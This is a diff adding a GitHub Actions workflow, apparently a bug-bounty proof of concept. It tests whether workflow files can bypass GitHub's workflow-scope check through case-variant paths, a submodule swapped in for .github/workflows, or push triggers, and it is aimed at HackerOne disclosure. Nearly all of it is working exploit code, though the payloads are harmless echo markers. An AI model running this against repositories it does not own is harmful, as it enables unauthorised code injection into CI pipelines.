@@ -1,0 +1,333 @@
+# Phase 2: Workflow Execution Verification
+#
+# Phase 1에서 3가지 bypass 경로 확인:
+#   A. 대소문자 변형 (.Github/workflows/)
+#   B2. 디렉토리 symlink (.github/workflows → safe-dir)
+#   D. Gitlink/submodule (.github/workflows = submodule)
+#
+# 이 테스트는 bypass된 경로의 workflow가 실제로 실행되는지 확인한다.
+# 방법: 각 bypass branch에 workflow_dispatch workflow를 넣고,
+#       API로 dispatch 시도 → 성공하면 Actions가 해당 workflow를 발견한 것.
+#
+# ⚠️ 본인 소유 테스트 repo에서만 실행할 것
+
+name: Phase 2 - Execution Verify
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+env:
+  API: https://api.github.com/repos/${{ github.repository }}
+
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    outputs:
+      head_sha: ${{ steps.info.outputs.head_sha }}
+      head_tree: ${{ steps.info.outputs.head_tree }}
+    steps:
+      - name: Gather info
+        id: info
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          BRANCH=$(curl -s -H "Authorization: token $GH_TOKEN" "$API" | jq -r '.default_branch')
+          HEAD_SHA=$(curl -s -H "Authorization: token $GH_TOKEN" "$API/git/ref/heads/$BRANCH" | jq -r '.object.sha')
+          HEAD_TREE=$(curl -s -H "Authorization: token $GH_TOKEN" "$API/git/commits/$HEAD_SHA" | jq -r '.tree.sha')
+          echo "head_sha=$HEAD_SHA" >> $GITHUB_OUTPUT
+          echo "head_tree=$HEAD_TREE" >> $GITHUB_OUTPUT
+
+  # ==============================================================
+  # Verify A: Case variation - does Actions discover .Github/workflows/?
+  # ==============================================================
+  verify-case:
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Verify A: Case variation execution"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
+          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
+          REPO: ${{ github.repository }}
+        run: |
+          echo "=== VERIFY A: Case Variation ==="
+
+          # Workflow that creates a marker file when run
+          WF='name: case-bypass-verify\non: workflow_dispatch\njobs:\n  verify:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo CASE_BYPASS_EXECUTED'
+
+          BLOB=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/blobs" \
+            -d "{\"content\":\"$WF\",\"encoding\":\"utf-8\"}" | jq -r '.sha')
+
+          # Create tree with .Github/workflows/ (capital G)
+          TREE=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/trees" \
+            -d "{
+              \"base_tree\":\"$HEAD_TREE\",
+              \"tree\":[{\"path\":\".Github/workflows/case-verify.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB\"}]
+            }" | jq -r '.sha')
+
+          echo "Tree: $TREE"
+
+          COMMIT=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/commits" \
+            -d "{\"message\":\"verify case bypass\",\"tree\":\"$TREE\",\"parents\":[\"$HEAD_SHA\"]}" | jq -r '.sha')
+
+          # Create branch
+          REF_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/refs" \
+            -d "{\"ref\":\"refs/heads/verify-case\",\"sha\":\"$COMMIT\"}")
+
+          echo "Branch created: $REF_HTTP"
+
+          if [ "$REF_HTTP" != "201" ]; then
+            echo "Branch creation failed"
+            exit 0
+          fi
+
+          # Wait for GitHub to index the branch
+          sleep 5
+
+          # Check 1: List workflows API - does GitHub see it?
+          echo ""
+          echo "--- Check: Does Actions API list the workflow? ---"
+          WORKFLOWS=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/$REPO/actions/workflows")
+          echo "$WORKFLOWS" | jq '.workflows[] | {id, name, path, state}' 2>/dev/null
+
+          # Check if our case-verify workflow appears
+          FOUND=$(echo "$WORKFLOWS" | jq -r '.workflows[] | select(.path | test("[Cc]ase-verify")) | .id')
+          echo "Found workflow ID: $FOUND"
+
+          # Check 2: Try to dispatch it
+          if [ -n "$FOUND" ] && [ "$FOUND" != "null" ]; then
+            echo ""
+            echo "--- Attempting workflow_dispatch ---"
+            DISPATCH_HTTP=$(curl -s -o /tmp/dispatch_a.json -w "%{http_code}" \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              -X POST "https://api.github.com/repos/$REPO/actions/workflows/$FOUND/dispatches" \
+              -d "{\"ref\":\"verify-case\"}")
+            echo "Dispatch HTTP: $DISPATCH_HTTP"
+            cat /tmp/dispatch_a.json 2>/dev/null
+
+            if [ "$DISPATCH_HTTP" = "204" ]; then
+              echo "::error::🔴🔴🔴 CRITICAL: Case-variant workflow EXECUTED!"
+            fi
+          else
+            echo "Actions did not discover the case-variant workflow"
+            echo "ℹ️ Bypass exists but workflow not executed (Medium severity)"
+          fi
+
+          # Check 3: Also try .github/Workflows/ (capital W)
+          echo ""
+          echo "--- Also testing .github/Workflows/ (capital W) ---"
+          BLOB2=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/blobs" \
+            -d "{\"content\":\"$WF\",\"encoding\":\"utf-8\"}" | jq -r '.sha')
+
+          TREE2=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/trees" \
+            -d "{
+              \"base_tree\":\"$HEAD_TREE\",
+              \"tree\":[{\"path\":\".github/Workflows/case-verify-w.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB2\"}]
+            }" | jq -r '.sha')
+
+          if [ -n "$TREE2" ] && [ "$TREE2" != "null" ]; then
+            COMMIT2=$(curl -s -H "Authorization: token $GH_TOKEN" \
+              -X POST "$API/git/commits" \
+              -d "{\"message\":\"verify case W\",\"tree\":\"$TREE2\",\"parents\":[\"$HEAD_SHA\"]}" | jq -r '.sha')
+
+            curl -s -H "Authorization: token $GH_TOKEN" \
+              -X POST "$API/git/refs" \
+              -d "{\"ref\":\"refs/heads/verify-case-w\",\"sha\":\"$COMMIT2\"}" > /dev/null
+
+            sleep 3
+
+            WORKFLOWS2=$(curl -s -H "Authorization: token $GH_TOKEN" \
+              "https://api.github.com/repos/$REPO/actions/workflows")
+            FOUND2=$(echo "$WORKFLOWS2" | jq -r '.workflows[] | select(.path | test("case-verify-w")) | .id')
+            echo "Capital-W workflow found: $FOUND2"
+
+            # Cleanup
+            curl -s -X DELETE -H "Authorization: token $GH_TOKEN" "$API/git/refs/heads/verify-case-w" 2>/dev/null
+          fi
+
+          # Cleanup
+          curl -s -X DELETE -H "Authorization: token $GH_TOKEN" "$API/git/refs/heads/verify-case" 2>/dev/null
+
+  # ==============================================================
+  # Verify D: Gitlink - does submodule affect workflow discovery?
+  # ==============================================================
+  verify-gitlink:
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Verify D: Gitlink/submodule effect"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
+          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
+          REPO: ${{ github.repository }}
+        run: |
+          echo "=== VERIFY D: Gitlink ==="
+          echo "Test: Replace .github/workflows with submodule → do existing workflows stop running?"
+          echo "This tests if gitlink can DELETE the workflow protection"
+
+          # Create tree with .github/workflows as gitlink (submodule pointer)
+          TREE=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/trees" \
+            -d "{
+              \"base_tree\":\"$HEAD_TREE\",
+              \"tree\":[{
+                \"path\":\".github/workflows\",
+                \"mode\":\"160000\",
+                \"type\":\"commit\",
+                \"sha\":\"$HEAD_SHA\"
+              }]
+            }" | jq -r '.sha')
+
+          echo "Tree: $TREE"
+
+          if [ "$TREE" = "null" ] || [ -z "$TREE" ]; then
+            echo "Tree creation failed"
+            exit 0
+          fi
+
+          COMMIT=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/commits" \
+            -d "{\"message\":\"gitlink verify\",\"tree\":\"$TREE\",\"parents\":[\"$HEAD_SHA\"]}" | jq -r '.sha')
+
+          REF_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/refs" \
+            -d "{\"ref\":\"refs/heads/verify-gitlink\",\"sha\":\"$COMMIT\"}")
+
+          echo "Branch: $REF_HTTP"
+
+          if [ "$REF_HTTP" != "201" ]; then
+            echo "Branch creation failed"
+            exit 0
+          fi
+
+          sleep 3
+
+          # Check what Actions sees on this branch
+          echo ""
+          echo "--- What workflows does Actions see on verify-gitlink branch? ---"
+          WORKFLOWS=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/$REPO/actions/workflows")
+          echo "$WORKFLOWS" | jq '.workflows[] | {id, name, path, state}'
+
+          # Check: can we see the .github/workflows directory content on this branch?
+          echo ""
+          echo "--- Contents of .github/workflows on verify-gitlink branch ---"
+          curl -s -H "Authorization: token $GH_TOKEN" \
+            "$API/contents/.github/workflows?ref=verify-gitlink" | jq '.' | head -20
+
+          # Impact analysis: if .github/workflows is a submodule,
+          # and the submodule repo contains malicious workflows,
+          # does GitHub resolve and run them?
+          echo ""
+          echo "ℹ️ Impact: If submodule is resolved, attacker controls workflow content"
+          echo "ℹ️ Even without execution, replacing .github/workflows bypasses scope check"
+
+          # Cleanup
+          curl -s -X DELETE -H "Authorization: token $GH_TOKEN" "$API/git/refs/heads/verify-gitlink" 2>/dev/null
+
+  # ==============================================================
+  # Verify E: Combined attack - case variant with push trigger
+  # ==============================================================
+  verify-push-trigger:
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Verify E: Push-triggered workflow via case bypass"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
+          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
+          REPO: ${{ github.repository }}
+        run: |
+          echo "=== VERIFY E: Push-trigger via case bypass ==="
+          echo "If Actions discovers case-variant paths, a push-triggered workflow"
+          echo "would execute automatically when the branch is created"
+
+          # Workflow with push trigger
+          WF='name: push-bypass-verify\non:\n  push:\n    branches: [verify-push-case]\njobs:\n  verify:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo PUSH_BYPASS_EXECUTED'
+
+          BLOB=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/blobs" \
+            -d "{\"content\":\"$WF\",\"encoding\":\"utf-8\"}" | jq -r '.sha')
+
+          # Try BOTH case variants in same tree
+          TREE=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/trees" \
+            -d "{
+              \"base_tree\":\"$HEAD_TREE\",
+              \"tree\":[
+                {\"path\":\".Github/workflows/push-verify.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB\"},
+                {\"path\":\".github/Workflows/push-verify2.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB\"}
+              ]
+            }" | jq -r '.sha')
+
+          echo "Tree: $TREE"
+
+          if [ "$TREE" = "null" ] || [ -z "$TREE" ]; then
+            echo "Tree creation blocked"
+            exit 0
+          fi
+
+          COMMIT=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/commits" \
+            -d "{\"message\":\"push trigger test\",\"tree\":\"$TREE\",\"parents\":[\"$HEAD_SHA\"]}" | jq -r '.sha')
+
+          REF_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/refs" \
+            -d "{\"ref\":\"refs/heads/verify-push-case\",\"sha\":\"$COMMIT\"}")
+
+          echo "Branch: $REF_HTTP"
+
+          # Wait and check if any workflow runs were triggered
+          sleep 10
+
+          echo ""
+          echo "--- Recent workflow runs ---"
+          RUNS=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/$REPO/actions/runs?per_page=5")
+          echo "$RUNS" | jq '.workflow_runs[] | {id, name, head_branch, status, event, created_at}'
+
+          # Check specifically for our push-triggered workflows
+          PUSH_RUNS=$(echo "$RUNS" | jq '.workflow_runs[] | select(.head_branch == "verify-push-case")')
+          if [ -n "$PUSH_RUNS" ]; then
+            echo "::error::🔴🔴🔴 CRITICAL: Push-triggered workflow EXECUTED from case-variant path!"
+            echo "$PUSH_RUNS" | jq '{id, name, status}'
+          else
+            echo "No workflow runs triggered on verify-push-case branch"
+          fi
+
+          # Cleanup
+          curl -s -X DELETE -H "Authorization: token $GH_TOKEN" "$API/git/refs/heads/verify-push-case" 2>/dev/null
+
+  summary:
+    needs: [verify-case, verify-gitlink, verify-push-trigger]
+    if: always()
+    runs-on: ubuntu-latest
+    steps:
+      - name: Final Assessment
+        run: |
+          echo "╔═══════════════════════════════════════════════════════╗"
+          echo "║  PHASE 2: EXECUTION VERIFICATION RESULTS              ║"
+          echo "╠═══════════════════════════════════════════════════════╣"
+          echo "║ If ANY test shows CRITICAL:                           ║"
+          echo "║   → Workflow scope bypass + code execution            ║"
+          echo "║   → HackerOne IMMEDIATELY                            ║"
+          echo "║   → Expected: $10,000-$30,000+ (Critical)            ║"
+          echo "║                                                       ║"
+          echo "║ If scope bypass confirmed but no execution:           ║"
+          echo "║   → Still reportable (Medium-High)                    ║"
+          echo "║   → Scope check bypass is security boundary violation ║"
+          echo "║   → Expected: $4,000-$10,000                         ║"
+          echo "╚═══════════════════════════════════════════════════════╝"
